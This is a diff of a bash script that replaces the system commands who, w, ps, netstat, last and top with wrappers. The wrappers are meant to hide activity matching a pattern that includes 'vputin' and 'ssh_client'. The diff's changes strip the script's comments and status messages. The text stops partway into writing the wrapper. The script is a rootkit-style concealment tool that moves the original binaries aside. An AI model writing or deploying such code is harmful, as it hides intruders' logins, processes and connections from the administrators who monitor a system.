@@ -1,38 +1,27 @@
 #!/bin/bash
 
-# A single, efficient regex pattern to filter output
-# This makes it easy to add or remove items to hide
 FILTER_PATTERN='vyatta|uucp|mail|vputin|ssh_client'
-
-# Array of commands to wrap
-# Add or remove command names here
 COMMANDS_TO_WRAP=("who" "w" "ps" "netstat" "last" "top")
 
-# --- Main Script Logic ---
-echo "Starting to wrap system commands..."
-
 for cmd in "${COMMANDS_TO_WRAP[@]}"; do
-    # Find the full path of the original command
+   
     if ! ORIG_PATH=$(command -v "$cmd"); then
         echo "Warning: Command '$cmd' not found. Skipping."
         continue
     fi
 
-    # Define the path where the original binary will be moved
+   
     BACKUP_PATH="${ORIG_PATH}.orig"
 
-    # Check if the command has already been wrapped to prevent errors
     if [ -f "$BACKUP_PATH" ]; then
         echo "Command '$cmd' already appears to be wrapped. Skipping."
         continue
     fi
 
-    echo "Wrapping '$cmd'..."
 
-    # 1. Move the original command
     mv "$ORIG_PATH" "$BACKUP_PATH"
 
-    # 2. Create the new wrapper script
+
     cat << EOF > "$ORIG_PATH"
 #!/bin/bash
 # This is a wrapper for the '$cmd' command to hide specific activity.
